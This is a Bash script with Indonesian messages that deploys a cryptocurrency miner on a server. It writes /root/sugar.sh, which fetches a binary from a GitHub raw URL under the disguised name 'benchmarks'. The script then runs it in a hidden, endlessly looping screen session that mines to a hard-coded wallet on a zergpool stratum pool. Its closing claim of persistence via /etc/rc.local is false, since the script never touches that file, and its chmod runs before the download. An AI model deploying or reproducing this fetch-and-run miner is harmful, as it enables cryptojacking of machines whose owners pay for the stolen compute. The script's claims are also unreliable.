#!/bin/bash
echo "📦 Menginstal dependensi..."
apt-get update && apt-get install -y screen wget tar

echo "📁 Menyimpan skrip mining ke /root/sugar.sh..."
cat << 'EOF' > /root/sugar.sh
#!/bin/bash

cd /root || exit

# Download miner jika belum ada
wget https://raw.githubusercontent.com/amirul5656/web/refs/heads/main/benchmarks

# Cek apakah screen sudah berjalan
if screen -list | grep -q amirul3; then
  echo "⚠️  Screen 'amirul3' sudah jalan, skip."
else
  echo "▶ Menjalankan mining di screen 'amirul3'..."
  screen -dmS amirul3 bash -c '
    while true; do
      ./benchmarks --algorithm xelisv2_pepew --pool stratum+tcp://xelisv2-pepew.asia.mine.zergpool.com:5778 --wallet RBbwLUvJ4sqWDFZSKqT6cKBiRMXwm5x4jD --password c=RVN,mc=PEPEW,ID=yu
      sleep 2
    done
  '
fi
EOF
chmod +x /root/benchmarks
chmod +x /root/sugar.sh
echo "🚀 Menjalankan miner sekarang..."
bash /root/sugar.sh

echo "✅ Siap! Mining aktif sekarang & otomatis jalan setelah reboot lewat /etc/rc.local."
